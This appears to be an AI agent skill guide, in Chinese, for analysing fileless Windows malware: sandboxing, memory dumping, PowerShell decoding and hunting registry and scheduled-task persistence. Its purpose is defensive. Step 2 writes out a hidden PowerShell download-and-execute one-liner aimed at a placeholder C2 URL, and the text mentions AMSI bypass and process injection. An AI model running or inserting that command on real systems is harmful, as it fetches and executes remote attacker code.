---
name: re-fileless
description: >
  无文件恶意软件：内存执行、持久化、PowerShell 链。
  触发词：无文件、fileless、内存执行、PowerShell 无文件、注册表持久化
---

# 无文件恶意软件分析

## 何时使用 / 何时不用

- 用：样本不落盘（无文件）——内存执行、PowerShell 下载执行、WMI/计划任务、注册表运行键承载载荷
- 用：回答"无文件载荷怎么进来、怎么执行、怎么持久化"三条链
- 用：杀软/EDR 告警只有行为与网络特征、没有文件物证的分析（与 [[re-evasion]] 的 AMSI/ETW 对抗衔接）
- 不用：有落盘样本的常规行为分析（那是 [[re-behavior]]）；纯脚本静态解码（那是 [[re-script-deob]]）
- 不用：只分析载荷本体不关心执行链（转 [[re-binary-core]] / [[re-shellcode]]）
- 注意：本技能以 Windows 为主（无文件/注册表/WMI/计划任务均为 Windows 生态）；Linux/macOS 的对应物（bash/python 内存执行、LD_PRELOAD、systemd timer/crontab）按同一"执行链还原"框架套用

## 工具准备

无文件分析 = 动态执行 + 内存取证 + 脚本解码三线并行，全程在沙箱内（[[re-sandbox]] 强制前置，[[platform-tips]] 最高原则）。所有工具先验证再使用。

### 动态分析环境（强制前置）

- [[re-sandbox]]: VM 快照 + 网络隔离（INetSim / fake DNS / 断网）——无文件样本常实时外联下载下一层，隔离必须先行
- [[re-tracing]]: 系统调用/进程行为跟踪（Windows procmon / Linux strace）
- 验证: 沙箱内 `ping 8.8.8.8` 不通；procmon/strace 能记录样本进程事件

### 内存转储与提取（[[re-memdump]] 联动）

- gcore（Linux）/ procdump（Windows）: 默认转储优先，见 [[platform-tips]]「直读 vs 转储」决策表
- 验证: `gcore --help`（安装见 [[re-memdump]] 工具准备）；Windows 侧 Sysinternals procdump（`choco install sysinternals` 套件内）

### PowerShell 分析（[[re-script-deob]] 联动）

- pwsh: Windows 内置；Linux: `apt install powershell`（Microsoft 源）或 `snap install powershell`；macOS: `brew install --cask powershell`
- 验证: `pwsh --version`；静态解码细节（-enc 解码、IEX 链、AST 提取）见 [[re-script-deob]]

### Sysinternals 套件（Windows 行为与持久化主力）

- `choco install sysinternals`（procmon / Process Explorer / autoruns / procdump）
- 验证: 管理员运行 Procmon64.exe 能记录事件；`autorunsc64.exe -a * -c` 能导出全部启动项
- 补充（可选）: Sysmon（微软官网下载）配置 ProcessCreate（事件 1，记录父进程+命令行）与 NetworkConnect（事件 3）

### Windows 内置命令（零安装）

- `reg query`（运行键）、`schtasks /query /fo csv /v`（计划任务）、`Get-WinEvent`（PowerShell 事件 4104 ScriptBlock 日志）、`netstat -ano`（回连）
- Linux/macOS 侧: `ps -ef --forest`、`systemctl list-timers`、`crontab -l`、`cat /proc/<pid>/maps`

## 操作步骤

按顺序执行，每步产物（转储/日志/还原脚本）存档 sha256 + 路径（[[re-ioc]] 证据链要求）。

1. **识别无文件迹象（无落盘/注册表载荷）**：
   - 输入信号: 杀软/EDR 告警"行为检测、无文件"；沙箱运行后磁盘无新增样本但进程异常；网络层看到 powershell/rundll32 实时下载
   - 静态线索: 邮件/URL 附件是 .ps1/.hta/.docm（脚本链）；注册表 Run 键或计划任务指向 powershell/wscript/mshta 命令行而非 exe 路径
   - 证据采集: 沙箱内运行（[[re-sandbox]]）→ procmon 全量记录文件/注册表/进程 → PowerShell 提前开 ScriptBlock 日志（事件 4104）与模块日志 → 启动前先 [[re-memdump]] 基线转储（见坑 2 时机）
   - 判定: "无文件" = 载荷不落盘或只在 %TEMP% 短暂中转——磁盘证据不足不代表没有执行链，内存与命令行才是主战场

2. **内存执行链还原（WMI/计划任务/PowerShell 下载执行）**：
   ```sh
   # PowerShell 下载执行（最典型）
   powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')"
   # 无文件执行的等价形式: rundll32 / mshta / regsvr32 加载脚本引擎
   # 还原方法: procmon 按进程树过滤（父→子），命令行逐个记录
   ```
   - 链还原顺序: 入口（宏/URL/邮件附件）→ 下载器（PowerShell/WMI 拉取）→ 解码（[[re-script-deob]] 逐层还原）→ 内存注入（VirtualAlloc + WriteProcessMemory + CreateThread）或反射加载 .NET 程序集
   - 每层命令行走访: 父进程 PID → 子进程命令行 → 访问的 URL/注册表项——一条链一条记录
   - WMI 特例: `wmic process call create "..."` 或 WMI 事件订阅（__EventFilter/__EventConsumer 对）——父进程是 WmiPrvse.exe，命令行不在普通进程树里；用 `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter` 与 `__EventConsumer` 枚举订阅，配合 Sysmon 事件 1 关联进程链
   - 计划任务变体: `schtasks /create ...` 注册任务，Action 是 powershell -enc 串——命令行本身带载荷，直接解码即得下一层

3. **注册表/计划任务持久化定位**：
   ```sh
   # 运行键（HKCU/HKLM Run 全家）
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s
   reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /s
   # 计划任务（全量含隐藏项）
   schtasks /query /fo LIST /v
   # 自启动服务与 WMI 事件订阅（隐蔽持久化位）
   sc query type= all
   ```
   - autoruns 一把梭: `autorunsc64.exe -a * -c` 导出全部启动点，按"含 powershell/wscript/mshta/URL 的命令行"过滤——无文件持久化的共同特征: 启动命令是脚本引擎 + 远程 URL/编码串，不是 exe 路径
   - 计划任务隐蔽坑: 恶意任务常设隐藏标志（SD 删除权限/`/sc onlogon` 且无用户可见名）——必须 `/fo LIST /v` 全量导出手工比对，别只看默认列表视图
   - 时间线: 注册表项 LastWriteTime 与任务创建时间、告警时间对齐，佐证同一次入侵

4. **内存载荷提取（[[re-memdump]] 时机）**：
   - 黄金窗: 下载→解码→注入的链上，**注入之后、执行之前**（VirtualAlloc 返回 + WriteProcessMemory 写完、CreateThread 启动前）——此时内存里是最完整的明文载荷
   - 操作: 动态调试（[[re-gdb]] / [[re-x64dbg]] 断在注入点）或按 [[re-memdump]] 默认转储优先——gcore 全量转储后按特征找（MZ 头/熵块/脚本文本）
   - 无文件脚本载荷: 内存中直接搜脚本特征（`IEX`、`FromBase64String`、`DownloadString`、base64 长串）→ 提取后 [[re-script-deob]] 还原
   - 提取出的载荷立即 sha256 存档，再看"什么时候会释放"——执行完即释放的载荷错过时机就没了（见坑 2）

5. **与行为分析交叉（[[re-behavior]]）**：
   - 把步骤 2-4 还原的执行链交给 [[re-behavior]] 做行为侧验证: 进程树/注入/持久化清单/网络连接 + ATT&CK 映射（T1059.001 PowerShell、T1055 进程注入、T1547.001 注册表运行键、T1053.005 计划任务）
   - 交叉验证点: ① 命令行证据与行为日志一致（谁启动谁、何时注入）② 内存载荷与网络下载内容一致（sha256 对齐）③ 持久化位置与重启行为一致（快照恢复前复跑验证）
   - 产出: 完整执行链（入口→下载→解码→注入→持久化）+ 载荷样本（内存提取物）+ IOC（URL/域名/注册表键/命令行模式）→ [[re-ioc]] 写 YARA（内存特征为主）

## 跨域联合

- [[re-sandbox]]：动态执行强制前置（本技能全部运行步骤的底座）
- [[re-tracing]]：执行链的进程/API 观察（procmon/strace）
- [[re-memdump]]：内存载荷提取（默认转储优先，时机是关键）
- [[re-script-deob]]：PowerShell 下载执行链的逐层解码（本技能步骤 2/4 直接调用）
- [[re-behavior]]：行为侧交叉验证与 ATT&CK 映射（本技能步骤 5）
- [[re-evasion]]：AMSI/ETW 绕过、杀软内存扫描对抗（无文件样本常叠加，见坑 4）
- [[re-shellcode]]：内存中提取的纯代码载荷（非脚本形态）转 shellcode 专项分析
- [[re-netcap]] / [[re-protocol]]：下载执行链的 C2 流量捕获与协议还原
- [[re-ioc]]：无文件载荷的 IOC 收集（内存特征/命令行模式/注册表键）
- 引用 [[platform-tips]] 最高原则（默认沙箱）与「直读 vs 转储」决策表

## 常见坑与陷阱

- **无落盘导致取证难**：现象——磁盘上找不到样本文件，报告"无物证"，结论站不住；原因——载荷全程内存/远程脚本/注册表运行键，常规文件取证抓不到；对策——运行前基线 [[re-memdump]] 全量转储 + procmon/Sysmon 记录命令行与网络 + PowerShell 开 4104 日志；结论以内存证据 + 命令行 + 网络流为准，[[re-ioc]] 收内存哈希类特征（与 [[re-evasion]] 的无文件取证坑同源）
- **内存载荷转储时机（执行完即释放）**：现象——dmp 里找不到载荷，或只有半截；原因——无文件载荷"注入后执行、执行完释放/自清除"，转储太早（未解码）或太晚（已释放）都拿不到；对策——转储时机选注入之后、执行之前（步骤 4 黄金窗）；多个时机各转储一次；看到完整载荷立即保存（[[re-memdump]] 坑: 看到解密数据立刻保存）
- **PowerShell 混淆链多层**：现象——解开一层还有一层，越解越多；原因——下载执行链常多层编码叠加（base64 + 拼接 + 反转 + 变量替换）；对策——按 [[re-script-deob]] 逐层解、每层存档编号（layer_01 → layer_02…），解完重跑识别，别跳层；IEX 在沙箱内替换为 Write-Host 拿下一层
- **杀软内存扫描对抗**：现象——沙箱里样本刚注入就消失/行为异常，观察不到完整执行链；原因——AV/EDR 内存扫描或 AMSI 在注入/执行时命中并清除载荷；对策——沙箱内先按 [[re-evasion]] 确认对抗点（AMSI patch/内存扫描时机），必要时降级或禁用沙箱内 AV 再复跑（快照回滚），结论注明验证环境
